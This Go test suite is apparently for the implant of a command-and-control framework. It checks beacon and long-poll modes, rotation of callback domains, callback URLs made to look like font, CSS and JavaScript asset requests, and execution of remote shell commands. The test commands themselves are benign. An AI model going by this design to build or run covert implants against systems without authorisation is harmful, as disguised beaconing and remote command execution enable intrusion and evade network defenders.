package agent

import (
	_ "embed"
	"slices"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/suite"
)

type AgentTestSuite struct {
	suite.Suite
	agent *Agent
}

func (suite *AgentTestSuite) SetupTest() {
	domains := []string{"testing.com", "testingagain.com"}
	beaconTime := 30
	watchdogTimer := 60
	suite.agent = newAgent(domains, "b", beaconTime, watchdogTimer)
}

func (suite *AgentTestSuite) TestIsBeacon() {
	beaconBool := isBeacon(suite.agent)
	assert.True(suite.T(), beaconBool)
}

func (suite *AgentTestSuite) TestIsLongPoll() {
	setLongpoll(suite.agent)
	longpollBool := isBeacon(suite.agent)
	assert.False(suite.T(), longpollBool)
}

func (suite *AgentTestSuite) TestRemoveDomain() {
	removeDomain(suite.agent, "testing.com")
	containsBool := slices.Contains(suite.agent.domains, "testing.com")
	assert.False(suite.T(), containsBool)
}

func (suite *AgentTestSuite) TestRemoveDomainOnlyOneDomainInList() {
	suite.agent.domains = []string{"testing.com"}
	err := removeDomain(suite.agent, "jkfladj.com")
	assert.EqualError(suite.T(), err, "domain list only has one domain, cannot remove")
}

func (suite *AgentTestSuite) TestRemoveDomainDomainDoesNotExists() {
	err := removeDomain(suite.agent, "imnotreal.com")
	assert.EqualError(suite.T(), err, "domain is not in the domain list")
}

func (suite *AgentTestSuite) TestAddDomainDomainExists() {
	err := addDomain(suite.agent, "testing.com")
	assert.EqualError(suite.T(), err, "domain already exists inside of the domain list")
}

func (suite *AgentTestSuite) TestSetBeaconInterWithSmallInt() {
	err := setBeaconInter(suite.agent, 0)
	assert.EqualError(suite.T(), err, "interval must be a positive integer")
}

//go:embed agent_config_test.json
var testConfigFile []byte

func (suite *AgentTestSuite) TestExtractAndCreateAgent() {
	agent, _, err := ExtractAndCreateAgent(testConfigFile)
	assert.NoError(suite.T(), err)
	assert.NotNil(suite.T(), agent)

	assert.Equal(suite.T(), []string{"testing.com", "testingagain.com"}, agent.domains)
	assert.Equal(suite.T(), "b", agent.mode)
	assert.Equal(suite.T(), 30, agent.beaconInter)
	assert.Equal(suite.T(), 60, agent.watchdogTimer)
	assert.Equal(suite.T(), "testing.com", agent.activeDomain)
	assert.True(suite.T(), agent.stayAlive)
}

func (suite *AgentTestSuite) TestURLParameters() {
	ac, err := extractAgentConfig(testConfigFile)
	assert.NoError(suite.T(), err)
	assert.NotNil(suite.T(), ac)

	assert.Equal(suite.T(), []string{"testing.com", "testingagain.com"}, ac.Domains)
	assert.Equal(suite.T(), 30, ac.BeaconTimer)
	assert.Equal(suite.T(), 60, ac.WatchdogTimer)

	assert.Contains(suite.T(), ac.URLExtensions.CommonPaths, "/assets")
	assert.Contains(suite.T(), ac.URLExtensions.RandomSegments, "a8f9d2c1")

	assert.Contains(suite.T(), ac.URLParameters.CommonParams, "v")
	assert.Contains(suite.T(), ac.URLParameters.TimestampValues, "1641234567")
	assert.Contains(suite.T(), ac.URLParameters.VersionValues, "1.2.3")
	assert.Contains(suite.T(), ac.URLParameters.HashValues, "a1b2c3d4e5f6")

	woffConfig, exists := ac.FileExtensions[".woff"]
	assert.True(suite.T(), exists)
	assert.Contains(suite.T(), woffConfig.Paths, "/assets/fonts")
	assert.Contains(suite.T(), woffConfig.Filenames, "opensans-regular")

	cssConfig, exists := ac.FileExtensions[".css"]
	assert.True(suite.T(), exists)
	assert.Contains(suite.T(), cssConfig.Paths, "/assets/css")
	assert.Contains(suite.T(), cssConfig.Filenames, "main.min")

	jsConfig, exists := ac.FileExtensions[".js"]
	assert.True(suite.T(), exists)
	assert.Contains(suite.T(), jsConfig.Paths, "/assets/js")
	assert.Contains(suite.T(), jsConfig.Filenames, "app.bundle.min")
}

func (suite *AgentTestSuite) TestGenerateURL() {
	ac, err := extractAgentConfig(testConfigFile)
	assert.NoError(suite.T(), err)
	assert.NotNil(suite.T(), ac)

	url, err := generateURL(suite.agent, ac, ".woff")
	assert.NoError(suite.T(), err)
	assert.NotEmpty(suite.T(), url)

	assert.Contains(suite.T(), url, "http://")
	assert.Contains(suite.T(), url, suite.agent.activeDomain)
	assert.Contains(suite.T(), url, ".woff")

	cssURL, err := generateURL(suite.agent, ac, ".css")
	assert.NoError(suite.T(), err)
	assert.NotEmpty(suite.T(), cssURL)
	assert.Contains(suite.T(), cssURL, ".css")

	invalidURL, err := generateURL(suite.agent, ac, ".invalid")
	assert.Error(suite.T(), err)
	assert.Empty(suite.T(), invalidURL)
	assert.EqualError(suite.T(), err, "not a valid extension or does not exist in the config")
}

func (suite *AgentTestSuite) TestCommandExecution() {
	result := executeCommand(suite.agent, "echo hello")
	assert.Contains(suite.T(), result, "hello")

	result = executeCommand(suite.agent, "echo test message")
	assert.Contains(suite.T(), result, "test message")

	result = executeCommand(suite.agent, "")
	assert.Equal(suite.T(), "Error: empty command", result)

	result = executeCommand(suite.agent, "nonexistentcommand12345")
	assert.NotEmpty(suite.T(), result)
	assert.NotContains(suite.T(), result, "hello")

	commands := []string{"echo first", "echo second", "echo third"}
	results := executeCommands(suite.agent, commands)
	assert.Len(suite.T(), results, 3)
	assert.Contains(suite.T(), results[0], "first")
	assert.Contains(suite.T(), results[1], "second")
	assert.Contains(suite.T(), results[2], "third")
}

func (suite *AgentTestSuite) TestCheckForModificationFlag() {
	assert.False(suite.T(), isModify(suite.agent))

	commandsWithFlag := []string{"echo hello", "agent_modification", "ls"}
	modificationFlagCheck(suite.agent, commandsWithFlag)
	assert.True(suite.T(), isModify(suite.agent))
	assert.NotContains(suite.T(), commandsWithFlag, "agent_modification")
	assert.Len(suite.T(), commandsWithFlag, 2)

	suite.agent.modificationCheck = false

	commandsWithoutFlag := []string{"echo hello", "ls", "pwd"}
	modificationFlagCheck(suite.agent, commandsWithoutFlag)
	assert.False(suite.T(), isModify(suite.agent))
	assert.Len(suite.T(), commandsWithoutFlag, 3)
}

// Required test to be able to run beforehand using the testing module that is native to go
func TestExampleTestSuite(t *testing.T) {
	suite.Run(t, new(AgentTestSuite))
}
